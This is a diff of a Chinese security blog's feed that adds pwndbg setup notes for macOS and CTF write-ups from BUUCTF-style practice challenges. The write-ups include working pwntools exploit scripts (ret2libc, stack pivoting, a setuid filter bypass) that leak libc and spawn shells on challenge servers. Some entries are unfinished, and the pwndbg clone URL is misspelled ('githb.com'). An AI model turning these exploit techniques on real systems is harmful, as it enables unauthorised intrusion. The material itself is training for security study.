@@ -2434,12 +2434,12 @@
 <a id="more"></a>
 
 <h2 id="报错Decompile-Error"><a href="#报错Decompile-Error" class="headerlink" title="报错Decompile Error"></a>报错Decompile Error</h2><p>提示为某一个地址analysis failed</p>
-<p><img src="IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%87%BA%E9%94%99/image-20201106111005929.png" alt="image-20201106111005929"></p>
+<p><img src="image-20201106111005929.png" alt="image-20201106111005929"></p>
 <p>找到这个对应的地址，发现是一个<code>call scanf</code></p>
 <p>可能是这个<code>scanf</code>的参数解析出现了错误</p>
 <p>在scanf上按Y重新定义</p>
 <p>写上正确的定义</p>
-<p><img src="IDA%E5%8F%8D%E7%BC%96%E8%AF%91%E5%87%BA%E9%94%99/image-20201106111142655.png" alt="image-20201106111142655"></p>
+<p><img src="image-20201106111142655.png" alt="image-20201106111142655"></p>
 <p>之后就可以反编译了</p>
 ]]></content>
   </entry>
@@ -4405,10 +4405,24 @@
 
 
 
-<h2 id="0x03-pwndbg配置和使用"><a href="#0x03-pwndbg配置和使用" class="headerlink" title="0x03 pwndbg配置和使用"></a>0x03 pwndbg配置和使用</h2><p>配置方法在<a href="https://river-li.github.io/2020/11/18/Docker">Docker</a>这里已经写了，这里主要写一下用法</p>
+<h2 id="0x03-pwndbg配置和使用"><a href="#0x03-pwndbg配置和使用" class="headerlink" title="0x03 pwndbg配置和使用"></a>0x03 pwndbg配置和使用</h2><h3 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h3><p>pwndbg在mac上主要有两种安装方法，一是直接装pwndbg；二是使用docker来安装</p>
+<p>用docker的安装配置方法在<a href="https://river-li.github.io/2020/11/18/Docker">Docker</a>这里已经写了</p>
+<p>直接安装pwndbg的话clone下来repo之后需要修改一点点东西</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://githb.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">vim setup.sh</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>需要将<code>setup.sh</code>从</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">131 <span class="comment"># Find the Python version used by GDB.</span></span><br><span class="line">132 PYVER=$(gdb -batch -q --nx -ex <span class="string">&#x27;pi import platform; print(&quot;.&quot;.join(platform.python_version_tuple()[:2]))&#x27;</span>)</span><br><span class="line">133 PYTHON+=$(gdb -batch -q --nx -ex <span class="string">&#x27;pi import sys; print(sys.executable)&#x27;</span>)</span><br><span class="line">134 PYTHON+=<span class="string">&quot;<span class="variable">$&#123;PYVER&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">131 <span class="comment"># Find the Python version used by GDB.</span></span><br><span class="line">132 PYVER=$(gdb -batch -q --nx -ex <span class="string">&#x27;pi import platform; print(&quot;.&quot;.join(platform.python_version_tuple()[:2]))&#x27;</span>)</span><br><span class="line">133 PYTHON+=$(gdb -batch -q --nx -ex <span class="string">&#x27;pi import sys; print(sys.executable)&#x27;</span>)</span><br><span class="line">134 <span class="comment">#PYTHON+=&quot;$&#123;PYVER&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要就是注释掉134行那里，因为mac下用brew安装的gdb是用的<code>python3.8</code>，不注释掉这里在后面调用的时候就是<code>python3.83.8</code></p>
+<h3 id="pwndbg使用"><a href="#pwndbg使用" class="headerlink" title="pwndbg使用"></a>pwndbg使用</h3><p>安装就到这里，下面就主要写一下用法</p>
 <p>为什么要用到pwndbg，不用peda和gef呢</p>
 <p>主要是针对mips、arm这样的架构，一般安装的peda、gef附加功能会有一些问题，没有办法用上stack、reg这样的指令，但是pwndbg就没问题</p>
-<p>（咕咕咕，后面补写）</p>
+<p>在pwndbg中输入pwndbg就可以列出pwndbg特有的命令</p>
 <h2 id="0x04-gdb连接到gdbserver时报错"><a href="#0x04-gdb连接到gdbserver时报错" class="headerlink" title="0x04 gdb连接到gdbserver时报错"></a>0x04 gdb连接到gdbserver时报错</h2><p>在调试qemu模拟的设备时一般需要将gdbserver上传到qemu模拟的系统中</p>
 <p>试了一些静态的gdbserver传过去之后attach，在remote连接过去的时候都会报这个错</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ignoring packet error, continuing...</span><br><span class="line">warning: unrecognized item &quot;timeout&quot; in &quot;qSupported&quot; response</span><br><span class="line">Ignoring packet error, continuing...</span><br><span class="line">Remote replied unexpectedly to &#39;vMustReplyEmpty&#39;: timeout</span><br></pre></td></tr></table></figure>
@@ -7166,6 +7180,97 @@
 <p>改成了send之后就没事了</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                                                                                                   </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29346</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./spwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload1 += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(elf.sym[<span class="string">&#x27;s&#x27;</span>]) + p32(<span class="number">0x08048408</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">real_write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,real_write)</span><br><span class="line">libc_base = real_write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload1 += p32(libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)) + p32(elf.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)) </span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>首先checksec</p>
+<p><img src="image-20201124163733385.png" alt="image-20201124163733385"></p>
+<p>开启了nx的32位程序</p>
+<p>程序存在漏洞的代码</p>
+<p><img src="image-20201124163754539.png" alt="image-20201124163754539"></p>
+<p>read溢出了0x8个字节，也就是只能控制esp和ra</p>
+<p>一共触发了两次，另外还有printf函数直接以字符串形式输出</p>
+<p>函数表中还存在一个hack函数</p>
+<p><img src="image-20201124164041962.png" alt="image-20201124164041962"></p>
+<p>这个函数其实只能输出’flag’这个字符串，并没办法输出里面的内容，这个的作用应该就是提供system函数</p>
+<p>由于这里调用了两次这个read，我们可以尝试将esp迁移到s的位置，这样第二次输入的内容就可以直接当做栈上需要的参数</p>
+<p>第一次输入需要正好覆盖28h，这样让程序可以输出爆存在栈上的old-ebp的值，然后动态调试找到old-ebp和s之间的偏移</p>
+<p>首先第一次的read，输入内容正好28h，让printf输出将要覆盖的ebp的值</p>
+<p><img src="image-20201124183926382.png" alt="image-20201124183926382"></p>
+<p>动态调试时可以看到泄漏的地址值为<code>0xffbb96f8</code></p>
+<p>而实际上我们控制的缓冲区s的地址是<code>0xffbb96c0</code>，两者之间相差了<code>0x38</code>，而根据我们shellcode的组织，<code>/bin/sh</code>字符串位于<code>0x28</code>的偏移处</p>
+<p>之后第二次的溢出，就是构造出栈迁移到s缓冲区上</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;aaaa&quot;</span> + p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;vul&#x27;</span>]) + p32(old_ebp - <span class="number">0x28</span>) + <span class="string">&quot;/bin/sh\x00&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>除了这一段的内容以外还需要将这个长度填充到28h</p>
+<p>之后的ebp和return address就填写栈迁移时用到的值，分别是s的起始地址和<code>leave;ret</code>的地址</p>
+<p>找到这样的gadget地址</p>
+<p><img src="image-20201124170421411.png" alt="image-20201124170421411"></p>
+<p>最终的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26407</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x80484b8</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">old_ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;vul&#x27;</span>]) + p32(old_ebp<span class="number">-0x28</span>)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload2 += (<span class="number">0x28</span>-len(payload2))*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">payload2 += p32(old_ebp<span class="number">-0x38</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="BJDCTF-2nd-test"><a href="#BJDCTF-2nd-test" class="headerlink" title="[BJDCTF 2nd]test"></a>[BJDCTF 2nd]test</h2><p>这个不是一个pwn题，是一个wargame的题目，ssh连到目标机器之后目录下有三个文件</p>
+<p><img src="image-20201124190458624.png" alt="image-20201124190458624"></p>
+<p>注意到这个test是有s权限的，那这就是一个比较明显的s-uid的题目了</p>
+<p>然后就是看到这个test.c中的内容</p>
+<p><img src="image-20201124190628122.png" alt="image-20201124190628122"></p>
+<p>这里输入的cmd不能含有这么一大堆的字符</p>
+<p>学到了grep的一个用法</p>
+<p>加上<code>-v</code>可以显示不含这些内容的东西</p>
+<p>加上<code>-E</code>可以将后面的字符串扩展到正则表达式</p>
+<p><img src="image-20201124194149126.png" alt="image-20201124194149126"></p>
+<p>这就是可以用的所有内容了</p>
+<p>这里下一步本来的思路是把cat放到<code>/tmp</code>，重命名成<code>dd</code>之后读flag</p>
+<p>但是发现这里的<code>x86_64</code>运行之后直接就没有了这些过滤条件，很神奇</p>
+<p>或者也可以用<code>od *</code>来读，这读到的是8进制的内容，需要之后再转码</p>
+<p><img src="image-20201124194437095.png" alt="image-20201124194437095"></p>
+<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>检查安全机制是32位程序</p>
+<p><img src="image-20201124194714204.png" alt="image-20201124194714204"></p>
+<p>开启了nx</p>
+<p>出现问题的函数</p>
+<p><img src="image-20201124194928727.png" alt="image-20201124194928727"></p>
+<p>就是read了0x100,而距离ebp只有0x88</p>
+<p>直接ret2libc，内容比较基础和前面原理都一样就略了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26517</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">write_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_real)</span><br><span class="line"></span><br><span class="line">libc_base = write_real - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><p>和level3基本一样，就是变成了64位程序</p>
+<p>也是和前面ret2libc类似，主要还是需要pop这样的gadget</p>
+<p>但是问题在于泄漏基地址时write需要三个参数，在64位中是rdi、rsi、rdx三个寄存器中</p>
+<p>本来应该对这里面每一个寄存器都赋值的，但是这里有一点就是在执行这个到返回之前有调用这样一个write的过程</p>
+<p><img src="image-20201124204045507.png" alt="image-20201124204045507"></p>
+<p>这个过程的第三个参数是<code>0x200</code>，也就是说这是rdx的值肯定是大于8的，所以我们可以直接拿来用，不经过原本的修改</p>
+<p>那么就只需要找pop rdi 和pop rsi的gadget了</p>
+<p><img src="image-20201124204212562.png" alt="image-20201124204212562"></p>
+<p>用到这两个</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26580</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(<span class="number">0x4006b3</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x4006b1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>])*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">real_read = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,real_read)</span><br><span class="line"></span><br><span class="line">libc_base = real_read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(<span class="number">0x4006b3</span>) + p64(libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)) + p64(libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd] r2t4"></a>[BJDCTF 2nd] r2t4</h2><p>首先checksec</p>
+<p><img src="buuctf-pwn1/image-20201124205504272.png" alt="image-20201124205504272"></p>
+<p>程序很少见的增加了canary</p>
+<p>用IDA 64 打开</p>
+<p>main函数</p>
+<p><img src="buuctf-pwn1/image-20201124205623122.png" alt="image-20201124205623122"></p>
+<p>这里溢出的字节很有限，只能溢出8个字节，这正好碰到了canary</p>
+<p>没办法控制返回地址和rbp</p>
+<p>注意到这个printf，很有意思，那这显然是一个格式化字符串的漏洞利用了</p>
+<p>程序中有一个这样的backdoor函数</p>
+<p><img src="buuctf-pwn1/image-20201124205604958.png" alt="image-20201124205604958"></p>
+<p>暂时放一放，格式化字符串漏洞还没细看</p>
+<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h2><p>checksec会发现是一个安全机制全关的程序</p>
+<p><img src="buuctf-pwn1/image-20201124212140407.png" alt="image-20201124212140407"></p>
+<p>这个程序本身很短</p>
+<p><img src="buuctf-pwn1/image-20201124211033313.png" alt="image-20201124211033313"></p>
+<p>start部分就这么短</p>
+<p>这里就调用了一个write，输出了0x14的字符，之后就read了0x3c的字符</p>
+<p>这里在ret之前将esp+14h</p>
+<p>也就是说在输入的这个位置就是返回值了</p>
+<p>函数内容很短，并且因为没有开保护机制，可以考虑直接在栈上写shellcode ，那么问题就是怎么得到栈上的地址</p>
+<p>可以在执行到要ret的时候将返回地址写成<code>mov ecx,esp</code>这个指令的地址，这样直接再执行一遍write</p>
 ]]></content>
       <categories>
         <category>buuctf</category>
